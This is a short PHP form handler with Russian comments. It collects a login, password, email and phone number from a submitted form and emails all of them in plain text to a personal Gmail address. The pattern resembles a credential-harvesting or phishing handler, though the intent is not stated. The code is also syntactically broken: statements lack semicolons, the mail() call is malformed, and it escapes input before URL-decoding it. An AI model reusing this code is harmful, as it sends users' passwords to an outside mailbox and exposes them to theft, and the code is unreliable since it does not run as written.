<?php 
	// Получаем данные формы

	$login = $_POST['login']
	$pass = $_POST['pass']
	$email = $_POST['email']
	$tel = $_POST['tel']

	$login = htmlspecialchars($login);
	$pass = htmlspecialchars($pass);
	$email = htmlspecialchars($email);
	$tel = htmlspecialchars($tel);

	$login = urldecode($login);
	$pass = urldecode($pass);
	$email = urldecode($email);
	$tel = urldecode($tel);

	$login = trim($login);
	$pass = trim($pass);
	$email = trim($email);
	$tel = trim($tel);


	//Отправка данных на почту 

	if (mail("tellsyt3@gmail.com")
			"Кто то прошел форму"
			"Логин:" .$login. "\n".	
			"Пароль:" .$pass. "\n".	
			"Почта:" .$email. "\n".	
			"Телефон:" .$tel. "\n",
			"From: no-reply@mydomain.ru")	
	) {
		echo ('Спасибо');
	}

	else {
		echo("Не правильно");
	}
?>